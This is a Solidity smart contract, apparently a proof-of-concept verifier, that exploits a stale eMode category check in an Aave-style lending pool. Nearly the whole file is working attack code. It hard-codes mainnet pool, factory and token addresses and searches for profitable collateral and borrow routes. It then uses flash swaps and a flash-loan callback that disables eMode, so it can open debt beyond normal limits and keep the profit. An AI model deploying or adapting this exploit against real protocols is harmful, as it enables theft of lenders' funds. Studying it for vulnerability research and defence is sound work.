// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
  function balanceOf(address account) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transfer(address to, uint256 amount) external returns (bool);
}

interface IPriceOracleGetterMinimal {
  function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderMinimal {
  function getPool() external view returns (address);
  function getPriceOracle() external view returns (address);
}

interface IPoolMinimal {
  struct ReserveConfigurationMap {
    uint256 data;
  }

  struct ReserveData {
    ReserveConfigurationMap configuration;
    uint128 liquidityIndex;
    uint128 currentLiquidityRate;
    uint128 variableBorrowIndex;
    uint128 currentVariableBorrowRate;
    uint128 currentStableBorrowRate;
    uint40 lastUpdateTimestamp;
    uint16 id;
    address aTokenAddress;
    address stableDebtTokenAddress;
    address variableDebtTokenAddress;
    address interestRateStrategyAddress;
    uint128 accruedToTreasury;
    uint128 unbacked;
    uint128 isolationModeTotalDebt;
  }

  struct EModeCategory {
    uint16 ltv;
    uint16 liquidationThreshold;
    uint16 liquidationBonus;
    address priceSource;
    string label;
  }

  function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderMinimal);
  function getReservesList() external view returns (address[] memory);
  function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
  function getReserveData(address asset) external view returns (ReserveData memory);
  function getEModeCategoryData(uint8 id) external view returns (EModeCategory memory);
  function getUserEMode(address user) external view returns (uint256);
  function getUserAccountData(
    address user
  )
    external
    view
    returns (
      uint256 totalCollateralBase,
      uint256 totalDebtBase,
      uint256 availableBorrowsBase,
      uint256 currentLiquidationThreshold,
      uint256 ltv,
      uint256 healthFactor
    );

  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
  function setUserEMode(uint8 categoryId) external;
  function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata interestRateModes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

interface IFlashLoanReceiverMinimal {
  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool);

  function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderMinimal);
  function POOL() external view returns (IPoolMinimal);
}

interface IUniswapV2FactoryMinimal {
  function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairMinimal {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
  function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IFlashLoanReceiverMinimal {
  uint256 private constant VARIABLE_RATE_MODE = 2;
  uint256 private constant BPS = 10_000;
  uint256 private constant MIN_PROFIT = 1e15;

  uint256 private constant LTV_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000;
  uint256 private constant DECIMALS_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFF;
  uint256 private constant ACTIVE_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFF;
  uint256 private constant BORROWING_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFFFFFFFFFFFF;
  uint256 private constant PAUSED_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFF;
  uint256 private constant EMODE_CATEGORY_MASK =
    0xFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
  uint256 private constant DEBT_CEILING_MASK =
    0xF0000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

  address private constant TARGET_POOL_IMPLEMENTATION =
    0xfD11AbA71c06061F446ADe4eec057179F19C23C4;
  address private constant UNISWAP_V2_FACTORY =
    0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
  address private constant SUSHISWAP_FACTORY =
    0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
  address private constant WETH =
    0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address private constant USDC =
    0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address private constant USDT =
    0xdAC17F958D2ee523a2206206994597C13D831ec7;
  address private constant DAI =
    0x6B175474E89094C44Da98b954EedeAC495271d0F;

  struct AssetConfig {
    uint256 raw;
    uint256 ltv;
    uint256 decimals;
    uint256 eModeCategory;
    uint256 debtCeiling;
    bool active;
    bool borrowingEnabled;
    bool paused;
  }

  struct Route {
    bool found;
    bool useOwnedCollateral;
    bool directRepayment;
    address fundingPair;
    address unwindPair;
    address collateralAsset;
    address borrowAsset;
    address bridgeAsset;
    uint256 collateralAmount;
    uint256 bridgeRepayAmount;
    uint256 borrowToBridgeAmount;
    uint256 projectedProfit;
    uint8 category;
  }

  struct BridgeEvalParams {
    address collateralAsset;
    address borrowAsset;
    address bridgeAsset;
    uint8 category;
    address fundingPair;
    address unwindPair;
    uint256 reserveCollateral;
    uint256 reserveBridgeFunding;
    uint256 reserveBorrowUnwind;
    uint256 reserveBridgeUnwind;
  }

  IPoolMinimal public immutable override POOL;
  IPoolAddressesProviderMinimal public immutable override ADDRESSES_PROVIDER;

  bool public attempted;
  bool public callbackTriggered;
  bool public hypothesisValidated;
  address public selectedCollateralAsset;
  address public selectedBorrowAsset;
  uint8 public selectedCategory;
  uint256 public selectedCollateralAmount;
  uint256 public selectedBorrowAmount;
  uint256 public selectedBorrowAmountBase;
  uint256 public normalAvailableBorrowsBaseBefore;
  uint256 public emodeAvailableBorrowsBaseBefore;
  uint256 public finalHealthFactor;
  address private _profitToken;
  uint256 private _profitAmount;
  uint256 private _profitBalanceBefore;
  string public lastFailureReason;

  constructor() {
    IPoolAddressesProviderMinimal provider = IPoolMinimal(TARGET_POOL_IMPLEMENTATION)
      .ADDRESSES_PROVIDER();
    address livePool = provider.getPool();
    if (livePool == address(0)) {
      livePool = TARGET_POOL_IMPLEMENTATION;
    }

    ADDRESSES_PROVIDER = provider;
    POOL = IPoolMinimal(livePool);
  }

  function executeOnOpportunity() external {
    if (attempted) {
      return;
    }
    attempted = true;
    lastFailureReason = "";

    address[] memory reserves = POOL.getReservesList();
    if (reserves.length == 0) {
      lastFailureReason = "live pool proxy has no listed reserves";
      return;
    }

    // Attempt strategy: use verifier-held collateral first if the harness pre-funds any live asset.
    Route memory route = _findBestOwnedCollateralRoute(reserves);
    if (!route.found) {
      route = _findBestFlashswapRoute(reserves);
    }
    if (!route.found) {
      lastFailureReason =
        "no profitable public-liquidity or owned-collateral route found for stale-emode debt opening";
      return;
    }

    selectedCollateralAsset = route.collateralAsset;
    selectedBorrowAsset = route.borrowAsset;
    selectedCategory = route.category;
    selectedCollateralAmount = route.collateralAmount;

    _profitToken = route.borrowAsset;
    _profitBalanceBefore = IERC20Minimal(route.borrowAsset).balanceOf(address(this));

    if (route.useOwnedCollateral) {
      if (!_executeOwnedCollateralRoute(route)) {
        _clearProfitState();
        if (bytes(lastFailureReason).length == 0) {
          lastFailureReason = "owned-collateral execution failed under current on-chain conditions";
        }
        return;
      }
    } else {
      if (!_startFlashswap(route)) {
        _clearProfitState();
        if (bytes(lastFailureReason).length == 0) {
          lastFailureReason = "public-liquidity funding failed under current on-chain conditions";
        }
        return;
      }
    }

    _profitAmount = IERC20Minimal(route.borrowAsset).balanceOf(address(this)) - _profitBalanceBefore;
    (, , , , , finalHealthFactor) = POOL.getUserAccountData(address(this));

    if (
      callbackTriggered &&
      POOL.getUserEMode(address(this)) == 0 &&
      selectedBorrowAmountBase > normalAvailableBorrowsBaseBefore &&
      _profitAmount >= MIN_PROFIT
    ) {
      hypothesisValidated = true;
    }
  }

  function executeOperation(
    address[] calldata,
    uint256[] calldata,
    uint256[] calldata,
    address initiator,
    bytes calldata params
  ) external override returns (bool) {
    if (msg.sender != address(POOL) || initiator != address(this)) {
      lastFailureReason = "unexpected flashLoan callback caller";
      return false;
    }

    callbackTriggered = true;
    uint8 category = abi.decode(params, (uint8));
    if (category == 0) {
      lastFailureReason = "invalid callback category";
      return false;
    }

    // exploit_paths[2]: the receiver changes its own eMode during the callback, but flash-loan
    // debt opening still reuses the stale category captured before the callback began.
    if (!_setUserEMode(0)) {
      lastFailureReason = "failed to disable eMode inside flashLoan callback";
      return false;
    }

    return true;
  }

  function uniswapV2Call(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external {
    Route memory route = abi.decode(data, (Route));
    if (msg.sender != route.fundingPair || sender != address(this)) {
      revert();
    }

    IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(route.fundingPair);
    address token0 = pair.token0();
    uint256 collateralReceived = route.collateralAsset == token0 ? amount0 : amount1;
    if (collateralReceived != route.collateralAmount || collateralReceived == 0) {
      revert();
    }

    _executeCollateralizedBorrow(route, collateralReceived);

    if (route.directRepayment) {
      if (!IERC20Minimal(route.borrowAsset).transfer(route.fundingPair, route.bridgeRepayAmount)) {
        revert();
      }
      return;
    }

    _swapBorrowForBridge(route);
    if (!IERC20Minimal(route.bridgeAsset).transfer(route.fundingPair, route.bridgeRepayAmount)) {
      revert();
    }
  }

  function profitToken() external view returns (address) {
    return _profitToken;
  }

  function profitAmount() external view returns (uint256) {
    return _profitAmount;
  }

  function exploitPaths() external pure returns (string[4] memory paths) {
    paths[0] =
      "Attacker-controlled contract enables a favorable eMode category for itself.";
    paths[1] =
      "The contract calls flashLoan(..., receiverAddress=self, onBehalfOf=self, interestRateModes[i] != 0).";
    paths[2] =
      "Inside executeOperation, the contract calls setUserEMode(0) or switches to a weaker category.";
    paths[3] =
      "After the callback, the pool still validates the debt opening with the stale cached userEModeCategory and mints debt that should no longer be allowed.";
  }

  function exploitPathUsed() external pure returns (string memory) {
    return
      "owned balance or public v2 flashswap funds collateral -> enable favorable eMode -> flashLoan(receiver=self,onBehalfOf=self,mode=variable) -> setUserEMode(0) in executeOperation -> stale cached eMode used for debt opening -> use only public liquidity to settle any temporary external funding leg";
  }

  function _executeOwnedCollateralRoute(Route memory route) internal returns (bool) {
    uint256 ownedBalance = IERC20Minimal(route.collateralAsset).balanceOf(address(this));
    if (ownedBalance < route.collateralAmount || route.collateralAmount == 0) {
      lastFailureReason = "insufficient verifier-held collateral for direct execution";
      return false;
    }

    return _executeCollateralizedBorrow(route, route.collateralAmount);
  }

  function _executeCollateralizedBorrow(
    Route memory route,
    uint256 collateralAmount
  ) internal returns (bool) {
    uint256 borrowAmount;
    address[] memory assets;
    uint256[] memory amounts;
    uint256[] memory modes;
    bool ok;

    if (!_approveIfNeeded(route.collateralAsset, address(POOL), collateralAmount)) {
      lastFailureReason = "collateral approval failed";
      return false;
    }
    POOL.supply(route.collateralAsset, collateralAmount, address(this), 0);

    (, , normalAvailableBorrowsBaseBefore, , , ) = POOL.getUserAccountData(address(this));

    // exploit_paths[0]: after supplying collateral, the verifier enables the favorable eMode
    // category on itself before entering the flash-loan path.
    if (!_setUserEMode(route.category)) {
      lastFailureReason = "failed to enable favorable eMode";
      return false;
    }

    (, , emodeAvailableBorrowsBaseBefore, , , ) = POOL.getUserAccountData(address(this));
    if (emodeAvailableBorrowsBaseBefore <= normalAvailableBorrowsBaseBefore) {
      lastFailureReason = "selected route does not increase borrow capacity";
      return false;
    }

    borrowAmount = _chooseBorrowAmount(route.borrowAsset, route.borrowToBridgeAmount);
    if (borrowAmount == 0) {
      lastFailureReason = "unable to size borrow above normal mode and unwind needs";
      return false;
    }

    selectedBorrowAmount = borrowAmount;
    selectedBorrowAmountBase = _toBase(route.borrowAsset, borrowAmount);

    assets = new address[](1);
    assets[0] = route.borrowAsset;
    amounts = new uint256[](1);
    amounts[0] = borrowAmount;
    modes = new uint256[](1);
    modes[0] = VARIABLE_RATE_MODE;

    // exploit_paths[1]: the verifier is both receiverAddress and onBehalfOf, and a non-zero
    // interestRateMode asks the pool to finalize the flash loan by opening debt instead of pulling
    // repayment.
    (ok, ) = address(POOL).call(
      abi.encodeWithSelector(
        IPoolMinimal.flashLoan.selector,
        address(this),
        assets,
        amounts,
        modes,
        address(this),
        abi.encode(route.category),
        uint16(0)
      )
    );
    if (!ok) {
      lastFailureReason = "flashLoan debt opening reverted";
      return false;
    }

    return true;
  }

  function _findBestOwnedCollateralRoute(
    address[] memory reserves
  ) internal view returns (Route memory best) {
    for (uint256 i = 0; i < reserves.length; ++i) {
      address collateralAsset = reserves[i];
      if (collateralAsset == address(0)) {
        continue;
      }

      uint256 ownedBalance = IERC20Minimal(collateralAsset).balanceOf(address(this));
      if (ownedBalance == 0) {
        continue;
      }

      AssetConfig memory collateralCfg = _readAssetConfig(collateralAsset);
      if (!_isEligibleCollateral(collateralCfg)) {
        continue;
      }

      uint8 category = uint8(collateralCfg.eModeCategory);
      if (POOL.getEModeCategoryData(category).ltv <= collateralCfg.ltv) {
        continue;
      }

      for (uint256 j = 0; j < reserves.length; ++j) {
        address borrowAsset = reserves[j];
        if (borrowAsset == address(0) || borrowAsset == collateralAsset) {
          continue;
        }

        AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
        if (!_isEligibleBorrowAsset(borrowCfg, collateralCfg.eModeCategory)) {
          continue;
        }

        uint256 emodeTokenMax = _projectEmodeBorrowCapacity(
          collateralAsset,
          borrowAsset,
          category,
          ownedBalance
        );
        if (emodeTokenMax <= MIN_PROFIT || emodeTokenMax <= best.projectedProfit) {
          continue;
        }

        best = Route({
          found: true,
          useOwnedCollateral: true,
          directRepayment: false,
          fundingPair: address(0),
          unwindPair: address(0),
          collateralAsset: collateralAsset,
          borrowAsset: borrowAsset,
          bridgeAsset: address(0),
          collateralAmount: ownedBalance,
          bridgeRepayAmount: 0,
          borrowToBridgeAmount: 0,
          projectedProfit: emodeTokenMax,
          category: category
        });
      }
    }
  }

  function _findBestFlashswapRoute(
    address[] memory reserves
  ) internal view returns (Route memory best) {
    uint16[8] memory bpsChoices = [uint16(5), 10, 25, 50, 100, 200, 500, 1000];

    for (uint256 i = 0; i < reserves.length; ++i) {
      address collateralAsset = reserves[i];
      if (collateralAsset == address(0)) {
        continue;
      }

      AssetConfig memory collateralCfg = _readAssetConfig(collateralAsset);
      if (!_isEligibleCollateral(collateralCfg)) {
        continue;
      }

      uint8 category = uint8(collateralCfg.eModeCategory);
      if (POOL.getEModeCategoryData(category).ltv <= collateralCfg.ltv) {
        continue;
      }

      for (uint256 j = 0; j < reserves.length; ++j) {
        address borrowAsset = reserves[j];
        if (borrowAsset == address(0) || borrowAsset == collateralAsset) {
          continue;
        }

        AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
        if (!_isEligibleBorrowAsset(borrowCfg, collateralCfg.eModeCategory)) {
          continue;
        }

        Route memory pairBest = _findBestFlashswapRouteForPair(
          collateralAsset,
          borrowAsset,
          category,
          bpsChoices
        );
        if (pairBest.projectedProfit > best.projectedProfit) {
          best = pairBest;
        }
      }
    }
  }

  function _findBestFlashswapRouteForPair(
    address collateralAsset,
    address borrowAsset,
    uint8 category,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    Route memory directRoute = _findDirectRoute(
      collateralAsset,
      borrowAsset,
      category,
      bpsChoices
    );
    if (directRoute.projectedProfit > best.projectedProfit) {
      best = directRoute;
    }

    for (uint256 bridgeIndex = 0; bridgeIndex < 4; ++bridgeIndex) {
      address bridgeAsset = _bridgeAssetAt(bridgeIndex);
      if (
        bridgeAsset == address(0) ||
        bridgeAsset == collateralAsset ||
        bridgeAsset == borrowAsset
      ) {
        continue;
      }

      Route memory bridgeRoute = _findBridgeRoute(
        collateralAsset,
        borrowAsset,
        bridgeAsset,
        category,
        bpsChoices
      );
      if (bridgeRoute.projectedProfit > best.projectedProfit) {
        best = bridgeRoute;
      }
    }
  }

  function _findBridgeRoute(
    address collateralAsset,
    address borrowAsset,
    address bridgeAsset,
    uint8 category,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    for (uint256 fundingFactoryIndex = 0; fundingFactoryIndex < 2; ++fundingFactoryIndex) {
      address fundingPair = IUniswapV2FactoryMinimal(_factoryAt(fundingFactoryIndex)).getPair(
        collateralAsset,
        bridgeAsset
      );
      if (fundingPair == address(0)) {
        continue;
      }

      (uint256 reserveCollateral, uint256 reserveBridgeFunding) = _pairReservesFor(
        fundingPair,
        collateralAsset,
        bridgeAsset
      );
      if (reserveCollateral == 0 || reserveBridgeFunding == 0) {
        continue;
      }

      Route memory candidate = _findBestBridgeRouteForFundingPair(
        collateralAsset,
        borrowAsset,
        bridgeAsset,
        category,
        fundingPair,
        reserveCollateral,
        reserveBridgeFunding,
        bpsChoices
      );
      if (candidate.projectedProfit > best.projectedProfit) {
        best = candidate;
      }
    }
  }

  function _findBestBridgeRouteForFundingPair(
    address collateralAsset,
    address borrowAsset,
    address bridgeAsset,
    uint8 category,
    address fundingPair,
    uint256 reserveCollateral,
    uint256 reserveBridgeFunding,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    for (uint256 unwindFactoryIndex = 0; unwindFactoryIndex < 2; ++unwindFactoryIndex) {
      address unwindPair = IUniswapV2FactoryMinimal(_factoryAt(unwindFactoryIndex)).getPair(
        borrowAsset,
        bridgeAsset
      );
      if (unwindPair == address(0)) {
        continue;
      }

      (uint256 reserveBorrowUnwind, uint256 reserveBridgeUnwind) = _pairReservesFor(
        unwindPair,
        borrowAsset,
        bridgeAsset
      );
      if (reserveBorrowUnwind == 0 || reserveBridgeUnwind == 0) {
        continue;
      }

      BridgeEvalParams memory params = BridgeEvalParams({
        collateralAsset: collateralAsset,
        borrowAsset: borrowAsset,
        bridgeAsset: bridgeAsset,
        category: category,
        fundingPair: fundingPair,
        unwindPair: unwindPair,
        reserveCollateral: reserveCollateral,
        reserveBridgeFunding: reserveBridgeFunding,
        reserveBorrowUnwind: reserveBorrowUnwind,
        reserveBridgeUnwind: reserveBridgeUnwind
      });

      Route memory candidate = _evaluateBridgePairCombination(params, bpsChoices);
      if (candidate.projectedProfit > best.projectedProfit) {
        best = candidate;
      }
    }
  }

  function _findDirectRoute(
    address collateralAsset,
    address borrowAsset,
    uint8 category,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    for (uint256 factoryIndex = 0; factoryIndex < 2; ++factoryIndex) {
      address pair = IUniswapV2FactoryMinimal(_factoryAt(factoryIndex)).getPair(
        collateralAsset,
        borrowAsset
      );
      if (pair == address(0)) {
        continue;
      }

      (uint256 reserveCollateral, uint256 reserveBorrow) = _pairReservesFor(
        pair,
        collateralAsset,
        borrowAsset
      );
      if (reserveCollateral == 0 || reserveBorrow == 0) {
        continue;
      }

      Route memory candidate = _evaluateDirectPairCombination(
        pair,
        collateralAsset,
        borrowAsset,
        category,
        reserveCollateral,
        reserveBorrow,
        bpsChoices
      );
      if (candidate.projectedProfit > best.projectedProfit) {
        best = candidate;
      }
    }
  }

  function _evaluateBridgePairCombination(
    BridgeEvalParams memory params,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    for (uint256 k = 0; k < bpsChoices.length; ++k) {
      uint256 collateralAmount = (params.reserveCollateral * bpsChoices[k]) / BPS;
      if (collateralAmount == 0 || collateralAmount >= params.reserveCollateral) {
        continue;
      }

      uint256 emodeTokenMax = _projectEmodeBorrowCapacity(
        params.collateralAsset,
        params.borrowAsset,
        params.category,
        collateralAmount
      );
      if (emodeTokenMax <= MIN_PROFIT) {
        continue;
      }

      uint256 bridgeRepayAmount = _getAmountIn(
        collateralAmount,
        params.reserveBridgeFunding,
        params.reserveCollateral
      );
      if (
        bridgeRepayAmount == type(uint256).max ||
        bridgeRepayAmount >= params.reserveBridgeUnwind
      ) {
        continue;
      }

      uint256 borrowToBridgeAmount = _getAmountIn(
        bridgeRepayAmount,
        params.reserveBorrowUnwind,
        params.reserveBridgeUnwind
      );
      if (
        borrowToBridgeAmount == type(uint256).max ||
        emodeTokenMax <= borrowToBridgeAmount + MIN_PROFIT
      ) {
        continue;
      }

      uint256 projectedProfit = emodeTokenMax - borrowToBridgeAmount;
      if (projectedProfit <= best.projectedProfit) {
        continue;
      }

      best = Route({
        found: true,
        useOwnedCollateral: false,
        directRepayment: false,
        fundingPair: params.fundingPair,
        unwindPair: params.unwindPair,
        collateralAsset: params.collateralAsset,
        borrowAsset: params.borrowAsset,
        bridgeAsset: params.bridgeAsset,
        collateralAmount: collateralAmount,
        bridgeRepayAmount: bridgeRepayAmount,
        borrowToBridgeAmount: borrowToBridgeAmount,
        projectedProfit: projectedProfit,
        category: params.category
      });
    }
  }

  function _evaluateDirectPairCombination(
    address pair,
    address collateralAsset,
    address borrowAsset,
    uint8 category,
    uint256 reserveCollateral,
    uint256 reserveBorrow,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    for (uint256 k = 0; k < bpsChoices.length; ++k) {
      uint256 collateralAmount = (reserveCollateral * bpsChoices[k]) / BPS;
      if (collateralAmount == 0 || collateralAmount >= reserveCollateral) {
        continue;
      }

      uint256 emodeTokenMax = _projectEmodeBorrowCapacity(
        collateralAsset,
        borrowAsset,
        category,
        collateralAmount
      );
      if (emodeTokenMax <= MIN_PROFIT) {
        continue;
      }

      uint256 borrowRepayAmount = _getAmountIn(collateralAmount, reserveBorrow, reserveCollateral);
      if (
        borrowRepayAmount == type(uint256).max ||
        emodeTokenMax <= borrowRepayAmount + MIN_PROFIT
      ) {
        continue;
      }

      uint256 projectedProfit = emodeTokenMax - borrowRepayAmount;
      if (projectedProfit <= best.projectedProfit) {
        continue;
      }

      best = Route({
        found: true,
        useOwnedCollateral: false,
        directRepayment: true,
        fundingPair: pair,
        unwindPair: address(0),
        collateralAsset: collateralAsset,
        borrowAsset: borrowAsset,
        bridgeAsset: borrowAsset,
        collateralAmount: collateralAmount,
        bridgeRepayAmount: borrowRepayAmount,
        borrowToBridgeAmount: borrowRepayAmount,
        projectedProfit: projectedProfit,
        category: category
      });
    }
  }

  function _projectEmodeBorrowCapacity(
    address collateralAsset,
    address borrowAsset,
    uint8 category,
    uint256 collateralAmount
  ) internal view returns (uint256) {
    if (collateralAmount == 0) {
      return 0;
    }

    AssetConfig memory collateralCfg = _readAssetConfig(collateralAsset);
    AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
    uint256 collateralPrice = _oracle().getAssetPrice(collateralAsset);
    uint256 borrowPrice = _oracle().getAssetPrice(borrowAsset);
    if (collateralPrice == 0 || borrowPrice == 0) {
      return 0;
    }

    uint256 collateralBase = (collateralAmount * collateralPrice) / (10 ** collateralCfg.decimals);
    uint256 emodeBase = (collateralBase * POOL.getEModeCategoryData(category).ltv) / BPS;
    uint256 emodeTokenMax = (emodeBase * (10 ** borrowCfg.decimals)) / borrowPrice;
    uint256 reserveLiquidity = IERC20Minimal(borrowAsset).balanceOf(
      POOL.getReserveData(borrowAsset).aTokenAddress
    );
    return emodeTokenMax < reserveLiquidity ? emodeTokenMax : reserveLiquidity;
  }

  function _startFlashswap(Route memory route) internal returns (bool) {
    IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(route.fundingPair);
    address token0 = pair.token0();
    uint256 amount0Out = route.collateralAsset == token0 ? route.collateralAmount : 0;
    uint256 amount1Out = route.collateralAsset == token0 ? 0 : route.collateralAmount;

    (bool ok, ) = route.fundingPair.call(
      abi.encodeWithSelector(
        IUniswapV2PairMinimal.swap.selector,
        amount0Out,
        amount1Out,
        address(this),
        abi.encode(route)
      )
    );
    return ok;
  }

  function _chooseBorrowAmount(
    address borrowAsset,
    uint256 borrowToBridgeAmount
  ) internal view returns (uint256) {
    AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
    uint256 price = _oracle().getAssetPrice(borrowAsset);
    if (price == 0) {
      return 0;
    }

    uint256 unit = 10 ** borrowCfg.decimals;
    uint256 normalTokenMax = (normalAvailableBorrowsBaseBefore * unit) / price;
    uint256 emodeTokenMax = (emodeAvailableBorrowsBaseBefore * unit) / price;
    uint256 reserveLiquidity = IERC20Minimal(borrowAsset).balanceOf(
      POOL.getReserveData(borrowAsset).aTokenAddress
    );

    if (emodeTokenMax > reserveLiquidity) {
      emodeTokenMax = reserveLiquidity;
    }

    uint256 minBorrow = normalTokenMax + 1;
    uint256 minProfitableBorrow = borrowToBridgeAmount + MIN_PROFIT + 1;
    if (minBorrow < minProfitableBorrow) {
      minBorrow = minProfitableBorrow;
    }

    if (emodeTokenMax <= minBorrow) {
      return 0;
    }

    // Stay comfortably below the observed eMode headroom to reduce revert risk from rounding or
    // interest index updates between account-data reads and final borrow validation.
    uint256 headroom = emodeTokenMax - minBorrow;
    return minBorrow + ((headroom * 4) / 5);
  }

  function _swapBorrowForBridge(Route memory route) internal {
    IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(route.unwindPair);
    address token0 = pair.token0();

    if (!IERC20Minimal(route.borrowAsset).transfer(route.unwindPair, route.borrowToBridgeAmount)) {
      revert();
    }

    uint256 amount0Out = route.bridgeAsset == token0 ? route.bridgeRepayAmount : 0;
    uint256 amount1Out = route.bridgeAsset == token0 ? 0 : route.bridgeRepayAmount;
    pair.swap(amount0Out, amount1Out, address(this), new bytes(0));
  }

  function _pairReservesFor(
    address pair,
    address assetIn,
    address assetOut
  ) internal view returns (uint256 reserveIn, uint256 reserveOut) {
    IUniswapV2PairMinimal v2Pair = IUniswapV2PairMinimal(pair);
    (uint112 reserve0, uint112 reserve1, ) = v2Pair.getReserves();
    address token0 = v2Pair.token0();
    address token1 = v2Pair.token1();

    if (token0 == assetIn && token1 == assetOut) {
      return (uint256(reserve0), uint256(reserve1));
    }
    if (token0 == assetOut && token1 == assetIn) {
      return (uint256(reserve1), uint256(reserve0));
    }
    return (0, 0);
  }

  function _toBase(address asset, uint256 amount) internal view returns (uint256) {
    AssetConfig memory cfg = _readAssetConfig(asset);
    return (amount * _oracle().getAssetPrice(asset)) / (10 ** cfg.decimals);
  }

  function _oracle() internal view returns (IPriceOracleGetterMinimal) {
    return IPriceOracleGetterMinimal(ADDRESSES_PROVIDER.getPriceOracle());
  }

  function _factoryAt(uint256 index) internal pure returns (address) {
    if (index == 0) {
      return UNISWAP_V2_FACTORY;
    }
    if (index == 1) {
      return SUSHISWAP_FACTORY;
    }
    return address(0);
  }

  function _bridgeAssetAt(uint256 index) internal pure returns (address) {
    if (index == 0) {
      return WETH;
    }
    if (index == 1) {
      return USDC;
    }
    if (index == 2) {
      return USDT;
    }
    if (index == 3) {
      return DAI;
    }
    return address(0);
  }

  function _getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) internal pure returns (uint256) {
    if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
      return type(uint256).max;
    }

    uint256 numerator = reserveIn * amountOut * 1000;
    uint256 denominator = (reserveOut - amountOut) * 997;
    return (numerator / denominator) + 1;
  }

  function _setUserEMode(uint8 category) internal returns (bool) {
    (bool ok, ) = address(POOL).call(
      abi.encodeWithSelector(IPoolMinimal.setUserEMode.selector, category)
    );
    return ok;
  }

  function _approveIfNeeded(address token, address spender, uint256 amount) internal returns (bool) {
    uint256 current = IERC20Minimal(token).allowance(address(this), spender);
    if (current >= amount) {
      return true;
    }

    if (current != 0 && !_safeApprove(token, spender, 0)) {
      return false;
    }

    return _safeApprove(token, spender, type(uint256).max);
  }

  function _safeApprove(address token, address spender, uint256 amount) internal returns (bool) {
    (bool ok, bytes memory ret) = token.call(
      abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
    );
    return ok && (ret.length == 0 || abi.decode(ret, (bool)));
  }

  function _readAssetConfig(address asset) internal view returns (AssetConfig memory cfg) {
    cfg.raw = POOL.getConfiguration(asset).data;
    cfg.ltv = cfg.raw & ~LTV_MASK;
    cfg.decimals = (cfg.raw & ~DECIMALS_MASK) >> 48;
    cfg.active = (cfg.raw & ~ACTIVE_MASK) != 0;
    cfg.borrowingEnabled = (cfg.raw & ~BORROWING_MASK) != 0;
    cfg.paused = (cfg.raw & ~PAUSED_MASK) != 0;
    cfg.eModeCategory = (cfg.raw & ~EMODE_CATEGORY_MASK) >> 168;
    cfg.debtCeiling = (cfg.raw & ~DEBT_CEILING_MASK) >> 212;
  }

  function _isEligibleCollateral(AssetConfig memory collateralCfg) internal pure returns (bool) {
    return
      collateralCfg.eModeCategory != 0 &&
      collateralCfg.ltv != 0 &&
      collateralCfg.active &&
      !collateralCfg.paused &&
      collateralCfg.debtCeiling == 0;
  }

  function _isEligibleBorrowAsset(
    AssetConfig memory borrowCfg,
    uint256 expectedCategory
  ) internal pure returns (bool) {
    return
      borrowCfg.eModeCategory == expectedCategory &&
      borrowCfg.decimals >= 15 &&
      borrowCfg.borrowingEnabled &&
      borrowCfg.active &&
      !borrowCfg.paused;
  }

  function _clearProfitState() internal {
    _profitToken = address(0);
    _profitAmount = 0;
    _profitBalanceBefore = 0;
  }
}
